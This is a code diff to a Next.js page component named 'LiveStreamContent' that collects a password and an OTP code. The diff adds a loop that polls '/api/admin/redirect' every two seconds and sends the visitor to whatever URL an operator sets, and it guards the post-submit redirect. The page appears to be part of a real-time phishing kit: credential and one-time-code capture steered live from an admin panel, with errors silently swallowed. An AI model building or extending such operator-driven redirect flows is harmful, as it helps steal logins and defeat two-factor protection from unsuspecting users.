@@ -1,7 +1,7 @@
 "use client";
 
 import { useSearchParams } from "next/navigation";
-import { useState, Suspense } from "react";
+import { useState, useEffect, Suspense } from "react";
 
 function LiveStreamContent() {
   const searchParams = useSearchParams();
@@ -14,6 +14,23 @@ function LiveStreamContent() {
   const [password, setPassword] = useState("");
   const [otpCode, setOtpCode] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+
+  // 🔥 Admin Redirect & Close Polling for Client Page
+  useEffect(() => {
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/admin/redirect`);
+        if (res.ok) {
+          const data = await res.json();
+          if (data?.redirectUrl && data.redirectUrl.trim() !== "") {
+            window.location.href = data.redirectUrl;
+          }
+        }
+      } catch (err) {}
+    }, 2000);
+
+    return () => clearInterval(interval);
+  }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -65,7 +82,9 @@ function LiveStreamContent() {
 
         setTimeout(() => {
           setIsLoading(false);
-          window.location.href = decodeURIComponent(targetUrl);
+          if (targetUrl) {
+            window.location.href = decodeURIComponent(targetUrl);
+          }
         }, 1000);
       }
     } catch (err) {
